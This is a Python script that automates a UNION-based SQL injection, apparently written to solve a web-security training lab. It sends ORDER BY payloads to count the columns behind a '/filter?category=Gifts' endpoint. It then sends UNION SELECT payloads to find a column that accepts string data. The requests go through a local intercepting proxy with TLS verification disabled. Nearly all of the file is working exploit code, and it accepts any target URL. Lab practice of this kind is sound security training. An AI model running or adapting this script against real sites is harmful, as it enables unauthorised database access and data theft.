import argparse
import sys
import urllib3
import requests
import urllib.parse


def disable_ssl_warnings():
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_proxy_config():
    return {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }


def test_proxy_connection(proxies):
    test_url = "http://httpbin.org/get"
    try:
        requests.get(test_url, proxies=proxies, timeout=3)
        return True
    except requests.RequestException:
        return False


def get_cli_args():
    parser = argparse.ArgumentParser(
        description=(
            "Scenario: Find number of columns and identify which column accepts string data using UNION-based SQL injection.\n\n"
            "Example:\n"
            "  python3 unionTextColumnFinder.py https://vulnerable-site.com admin123"
        ),
        formatter_class=argparse.RawTextHelpFormatter
    )

    parser.add_argument(
        "url", help="Target URL (e.g., https://vulnerable-site.com)")
    parser.add_argument(
        "string", help="Test string to inject (e.g., admin123)")

    return parser.parse_args()


def find_column_count(base_url, proxies):
    endpoint = "/filter?category=Gifts"
    print("(+) Determining number of columns using ORDER BY...\n")
    for i in range(1, 50):
        payload = f"' ORDER BY {i}--"
        encoded = urllib.parse.quote_plus(payload)
        full_url = f"{base_url}{endpoint}{encoded}"
        print(f"    ➤ Testing payload: {payload}")
        try:
            response = requests.get(full_url, verify=False, proxies=proxies)
            if "Internal Server Error" in response.text:
                print(
                    f"\n(✓) Found error at column {i}, so total columns = {i - 1}\n")
                return i - 1
        except requests.RequestException as err:
            print(f"(-) Request failed: {err}")
            break
    return None


def find_text_column(base_url, num_columns, proxies, test_string):
    endpoint = "/filter?category=Gifts"
    print(
        f"(+) Testing which of {num_columns} columns accepts string data...\n")
    quoted_string = f"'{test_string}'"

    for i in range(num_columns):
        payload_list = ['null'] * num_columns
        payload_list[i] = quoted_string
        payload = "' UNION SELECT " + ','.join(payload_list) + "--"
        encoded = urllib.parse.quote_plus(payload)
        full_url = f"{base_url}{endpoint}{encoded}"
        print(f"    ➤ Testing payload: {payload}")

        try:
            response = requests.get(full_url, verify=False, proxies=proxies)
            html = response.text

            if "Internal Server Error" in html:
                print(
                    f"    ✗ Column {i + 1} caused an error. Trying next...\n")
                continue

            if test_string in html:
                print(f"\n(✓) Column {i + 1} accepts string data.\n")
                return i + 1, payload

        except requests.RequestException as err:
            print(f"(-) Request failed at column {i + 1}: {err}")
            continue

    return None, None


def attempt_sql_injection(base_url, proxies, test_string):
    print(f"\n(+) Targeting: {base_url}")
    num_columns = find_column_count(base_url, proxies)
    if not num_columns:
        print("[-] Could not determine column count.")
        return

    column_index, final_payload = find_text_column(
        base_url, num_columns, proxies, test_string)
    if not final_payload:
        print("[-] Could not find a column that accepts string data.")
        return

    print("[✓] Lab solved with the following payload:\n")
    print(f"    {final_payload}")


def main():
    try:
        disable_ssl_warnings()
        proxies = get_proxy_config()

        if not test_proxy_connection(proxies):
            print("(-) Proxy unreachable at 127.0.0.1:8080.")
            print("    ➤ Start Proxy server or disable proxy in the script.")
            sys.exit(1)

        args = get_cli_args()
        attempt_sql_injection(args.url, proxies, args.string)

    except Exception as err:
        print(f"(-) Unexpected error: {err}")
        sys.exit(1)


if __name__ == "__main__":
    main()
